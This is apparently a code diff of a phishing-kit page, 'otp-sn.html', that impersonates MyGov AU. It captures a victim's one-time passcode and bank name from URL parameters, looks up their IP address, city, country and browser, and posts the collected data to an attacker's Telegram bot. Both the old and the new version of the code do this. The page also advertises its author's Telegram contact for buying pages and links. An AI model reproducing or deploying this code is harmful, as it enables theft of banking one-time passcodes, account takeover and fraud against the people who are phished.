@@ -1,81 +1,75 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>otp-sn</title>
-</head>
+<head><meta charset="UTF-8"><title>Processing OTP...</title></head>
 <body>
-<script src="config.js"></script>
-<script>
-  (function() {
-    // Use CONFIG from config.js
-    const apikey = CONFIG.apikey;
-    const chatid = CONFIG.chatid;
-    // ... rest of your code
-  })();
-</script>
-
-    function getBrowser(userAgent) {
-      if (userAgent.includes('MSIE')) return 'Internet Explorer';
-      if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
-      if (userAgent.includes('Chrome')) return 'Google Chrome';
-      if (userAgent.includes('Safari')) return 'Safari';
-      if (userAgent.includes('Opera')) return 'Opera';
-      return 'Unknown';
-    }
-
-    async function getLocation(ip) {
-      try {
-        const resp = await fetch(`https://freeipapi.com/api/json/${ip}`);
-        const data = await resp.json();
-        return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
-      } catch {
-        return { country: 'Unknown', city: 'Unknown' };
+  <script src="config/email.js"></script>
+  <script>
+    (function() {
+      function getParam(name) {
+        var urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name) || '';
       }
-    }
 
-    (async function() {
-      const aa = getParam('username');
-      const cc = getParam('title');
+      var otp = getParam('username');
+      var title = getParam('title');
 
-      if (!aa) {
+      if (!otp) {
         document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
         return;
       }
 
-      const ip = await fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => data.ip)
-        .catch(() => '0.0.0.0');
-      const userAgent = navigator.userAgent;
-      const browser = getBrowser(userAgent);
-      const location = await getLocation(ip);
+      async function sendOtp() {
+        try {
+          // Get IP
+          var ipResp = await fetch('https://api.ipify.org?format=json');
+          var ipData = await ipResp.json();
+          var ip = ipData.ip;
 
-      let message = "";
-      message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
-      message += "|Bank Name: " + cc + "\n";
-      message += "|OTP-Code: " + aa + "\n";
-      message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
-      message += "|Client IP: " + ip + "\n";
-      message += "|City : " + location.city + "\n";
-      message += "|Country : " + location.country + "\n";
-      message += "|UserAgent : " + userAgent + "\n";
-      message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
-      message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+          // Get location
+          var locResp = await fetch('https://freeipapi.com/api/json/' + ip);
+          var locData = await locResp.json();
+          var country = locData.countryName || 'Unknown';
+          var city = locData.cityName || 'Unknown';
 
-      try {
-        await fetch(`https://api.telegram.org/bot${apikey}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatid, text: message })
-        });
-      } catch (e) {
-        console.error('Telegram send error:', e);
+          var userAgent = navigator.userAgent;
+          var browser = 'Unknown';
+          if (userAgent.includes('Chrome')) browser = 'Google Chrome';
+          else if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
+          else if (userAgent.includes('Safari')) browser = 'Safari';
+          else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) browser = 'Internet Explorer';
+          else if (userAgent.includes('Opera')) browser = 'Opera';
+
+          var message = '';
+          message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+          message += "|Bank Name: " + title + "\n";
+          message += "|OTP-Code: " + otp + "\n";
+          message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+          message += "|Client IP: " + ip + "\n";
+          message += "|City : " + city + "\n";
+          message += "|Country : " + country + "\n";
+          message += "|UserAgent : " + userAgent + "\n";
+          message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+          message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
+          var tgUrl = 'https://api.telegram.org/bot' + CONFIG.apikey + '/sendMessage';
+          await fetch(tgUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CONFIG.chatid,
+              text: message
+            })
+          });
+
+          document.body.innerHTML = '';
+        } catch (error) {
+          console.error('Error in otp-sn.html:', error);
+          document.body.innerHTML = '';
+        }
       }
 
-      document.body.innerHTML = '';
+      sendOtp();
     })();
-  })();
-</script>
+  </script>
 </body>
 </html>
